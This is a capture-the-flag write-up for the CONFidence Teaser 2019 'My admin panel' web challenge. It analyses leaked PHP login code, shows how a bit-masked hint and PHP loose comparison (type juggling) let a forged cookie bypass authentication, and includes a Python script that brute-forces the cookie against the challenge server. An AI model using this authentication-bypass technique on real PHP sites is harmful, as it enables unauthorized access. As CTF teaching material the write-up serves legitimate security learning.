# CONFidence CTF Teaser 2019 – My admin panel

* **Category:** web, warmup
* **Points:** 51

## Challenge

> I think I've found something interesting, but I'm not really a PHP expert. Do you think it's exploitable?
>
> https://gameserver.zajebistyc.tf/admin/

## Solution

The website has directory listing active, connecting to it two files are listed:
* `login.php`
* `login.php.bak`

The first page prints the message: `Not authenticated.`.

The [second file](login.php.bak) contains the PHP source code.

```php
<?php

include '../func.php';
include '../config.php';

if (!$_COOKIE['otadmin']) {
    exit("Not authenticated.\n");
}

if (!preg_match('/^{"hash": [0-9A-Z\"]+}$/', $_COOKIE['otadmin'])) {
    echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n";
    exit();
}

$session_data = json_decode($_COOKIE['otadmin'], true);

if ($session_data === NULL) { echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n"; exit(); }

if ($session_data['hash'] != strtoupper(MD5($cfg_pass))) {
    echo("I CAN EVEN GIVE YOU A HINT XD \n");

    for ($i = 0; i < strlen(MD5('xDdddddd')); i++) {
        echo(ord(MD5($cfg_pass)[$i]) & 0xC0);
    }

    exit("\n");
}

display_admin();
```

Analyzing it, you can discover that a cookie named `otadmin` must be passed and its format must follow the following regex: `/^{"hash": [0-9A-Z\"]+}$/`.

A correct value for that cookie can be the following: `{"hash": "T35T"}`.

If the passed value for that cookie is different from the MD5 hash of the `$cfg_pass` variable, a hint is given. You can use the correct value crafted befor to print it.

```
I CAN EVEN GIVE YOU A HINT XD 0006464640640064000646464640006400640640646400
```

The hint is obtained by the following snippet.

```php
    for ($i = 0; i < strlen(MD5('xDdddddd')); i++) {
        echo(ord(MD5($cfg_pass)[$i]) & 0xC0);
    }
```

Where `strlen(MD5('xDdddddd'))` is equals to 32 (i.e. the length of MD5 hashes is 32).

In that snippet, an AND operation is performed between the ASCII value of each char and the constant `0xC0` (i.e. `11000000`). Considering that the first three chars of the hint are 0, it means that the first original chars of the hash were numbers. That is due to the fact in the ASCII representation of numbers, the first most significant bits are `00` and the AND operation for that bits is performed with `11`.

So, the problem could be located in a *type juggling* in this comparison:

```php
$session_data['hash'] != strtoupper(MD5($cfg_pass))
```

To exploit it, you have to guess the numbers at the beginning of the MD5 string.

A [Python script](my-admin-panel.py) can be written to exploit this task.

```python
import time
import random
import os
import urllib2

target_url = "https://gameserver.zajebistyc.tf/admin/login.php"
cookie_name = "otadmin"
cookie_value = "{{\"hash\": {}}}"

# Check cookie method.
def check_cookie(value_to_check):
   
   # Trying cookie.
   cookie = "{}={}".format(cookie_name, cookie_value.format(value_to_check))
   print "[*] Trying cookie {}".format(cookie)      
   req = urllib2.Request(target_url)
   req.add_header("Cookie", cookie)
   req.add_header("User-Agent", "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);")
   page = urllib2.urlopen(req)
   content = page.read()
      
   # Flag found.
   if "p4{" in content:
      print content
      return True
   else:
      return False

# Main method.
for i in range(1, 1000):

   try:
      
      if check_cookie(i):
         break
   
   except urllib2.HTTPError as err:
      print "[*] Response > {}".format(err.code)
      break

```

With the cookie `otadmin={"hash": 389}` you will discover the flag.

```
p4{wtf_php_comparisons_how_do_they_work}
```